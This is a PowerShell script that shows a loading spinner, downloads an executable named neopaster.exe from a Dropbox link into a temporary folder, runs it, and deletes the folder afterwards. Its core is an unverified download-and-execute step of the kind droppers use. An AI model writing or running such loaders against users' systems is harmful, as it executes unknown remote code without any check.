function Show-Loading {
    param(
        [string]$Message = "Downloading",
        [int]$Delay = 100
    )
    $spinner = @('|', '/', '-', '\')
    $host.UI.RawUI.WindowTitle = "$Message [ ]"
    $idx = 0
    
    # Create timer-based animation
    $timer = [System.Diagnostics.Stopwatch]::StartNew()
    while ($timer.Elapsed.TotalSeconds -lt 300) { # Max 5 minutes
        $cursorPos = $host.UI.RawUI.CursorPosition
        $host.UI.RawUI.CursorPosition = @{X=0; Y=$cursorPos.Y}
        Write-Host "$Message $($spinner[$idx % 4])" -NoNewline -ForegroundColor Cyan
        $idx++
        Start-Sleep -Milliseconds $Delay
    }
}

$url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"
$tempdir = "$env:TEMP\$(New-Guid)"

try {
    # Suppress native progress
    $ProgressPreference = 'SilentlyContinue'
    
    # Create temp directory
    mkdir $tempdir -Force | Out-Null
    $file = "$tempdir\app.exe"

    # Start loading in separate runspace
    $ps = [PowerShell]::Create().AddScript({
        param($Message)
        Show-Loading -Message $Message
    }).AddArgument("Downloading neopaster.exe")
    
    $handle = $ps.BeginInvoke()

    # Download file
    try {
        Invoke-RestMethod -Uri $url -OutFile $file -ErrorAction Stop
    }
    finally {
        # Clean up animation
        $ps.Stop()
        $ps.Dispose()
        Write-Host "`r" + (' ' * ($Host.UI.RawUI.WindowSize.Width)) + "`r" -NoNewline
    }

    Write-Host "`rDownload complete!`n" -ForegroundColor Green

    # Execute file
    Write-Host "Starting application..." -ForegroundColor Yellow
    $proc = Start-Process $file -PassThru -Wait 
    Write-Host "Process exited with code: $($proc.ExitCode)" -ForegroundColor White

} catch {
    Write-Error "`nAn error occurred: $_" -ErrorAction Continue
} finally {
    # Cleanup files
    Remove-Item $tempdir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Temporary files cleaned" -ForegroundColor DarkGray
    $ProgressPreference = 'Continue'  # Reset preference
}
